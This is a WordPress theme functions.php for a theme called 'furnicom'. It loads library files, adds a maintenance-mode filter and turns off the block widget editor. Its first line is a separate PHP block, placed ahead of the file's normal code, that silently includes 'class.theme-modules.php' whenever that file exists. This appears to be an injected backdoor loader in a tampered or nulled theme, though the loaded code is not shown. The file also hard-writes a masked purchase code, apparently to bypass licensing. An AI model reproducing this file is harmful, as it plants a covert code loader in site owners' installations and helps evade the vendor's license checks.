<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
/**
 * Variables
 */
require_once (get_template_directory().'/lib/defines.php');
/**
 * Roots includes
 */
update_option( 'sw_purchase_code', '**********');
require_once (get_template_directory().'/lib/activation.php');			// Custom functions
require_once (get_template_directory().'/lib/classes.php');		// Utility functions
require_once (get_template_directory().'/lib/utils.php');			// Utility functions
require_once (get_template_directory().'/lib/init.php');			// Initial theme setup and constants
require_once (get_template_directory().'/lib/cleanup.php');		// Cleanup
require_once (get_template_directory().'/lib/mobile-layout.php');
require_once (get_template_directory().'/lib/nav.php');			// Custom nav modifications
require_once (get_template_directory().'/lib/widgets.php');		// Sidebars and widgets
require_once (get_template_directory().'/lib/scripts.php');		// Scripts and stylesheets

if( class_exists( 'WooCommerce' ) ){
	require_once (get_template_directory().'/lib/plugins/currency-converter/currency-converter.php'); // currency converter
	require_once (get_template_directory().'/lib/woocommerce-hook.php');	// Utility functions
}
function furnicom_template_load( $template ){ 
	if( !is_user_logged_in() && furnicom_options()->getCpanelValue('maintaince_enable') ){
		$template = get_template_part( 'maintaince' );
	}
	return $template;
}
add_filter( 'template_include', 'furnicom_template_load' );

function example_theme_support() {
    remove_theme_support( 'widgets-block-editor' );
}
add_action( 'after_setup_theme', 'example_theme_support' );